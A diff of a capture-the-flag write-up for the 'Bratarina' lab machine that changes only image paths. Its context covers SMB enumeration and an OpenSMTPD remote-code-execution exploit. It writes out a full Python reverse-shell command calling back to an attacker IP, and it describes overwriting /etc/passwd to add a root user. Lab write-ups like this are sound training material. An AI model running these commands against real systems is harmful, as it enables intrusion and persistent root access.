@@ -66,33 +66,33 @@ Nmap done: 1 IP address (1 host up) scanned in 47.80 seconds
 ```
 
 Enumerating SMB.
-![](Bratarina1.png)
+![](Images/Bratarina1.png)
 
-![](Bratarina2.png)
+![](Images/Bratarina2.png)
 Before jumping to SMTP. We looked for web sever on port 80 but we found nothing interesting.
 That was everything I could get from SMB, I moved my attention to SMPT, the smpt version is OPENSMTP, i searched for a vulnerability and there was one RCE.
 
-![](Bratarina3.png)
+![](Images/Bratarina3.png)
 The exploit enabled use to run a command
-![](Bratarina4.png)
+![](Images/Bratarina4.png)
 We have to two methods 2 exploit this 
 ### Method 1
 In this exploit, we used a Python-based exploit, and after that, we were able to run commands on the target server
 ```python
 python3 47984.py 192.168.155.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.193\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
 ```
-![](Bratarina5.png)
+![](Images/Bratarina5.png)
 Before running above command we started nc on port 80. Just after hitting the above command we received shell on nc.
-![](Bratarina6.png)
+![](Images/Bratarina6.png)
 
 ### Method 
 If we are unable to make the porper payload and it didn't work. Then we can take advantage of `passwd.bak` file. As we are aware that we can use command with the exploit. We will do following:
 I will edit the passwd.back, add new user, upload it back to the machine to replace /etc/passwd and then use the new user to have access.
-![](Bratarina7.png)
-![](Bratarina8.png)
-![](Bratarina9.png)
+![](Images/Bratarina7.png)
+![](Images/Bratarina8.png)
+![](Images/Bratarina9.png)
 This command generates a **hashed (encrypted) version** of the password `qwerty@123`.
 Adding user to `passwd.bak`.
 This command **adds a new user entry**(offsec) to the system’s `passwd.bak` file.
-![](Bratarina10.png)
+![](Images/Bratarina10.png)
 Then using ssh we will login and capture the root flag, as the user `offsec` we created has root privileges.
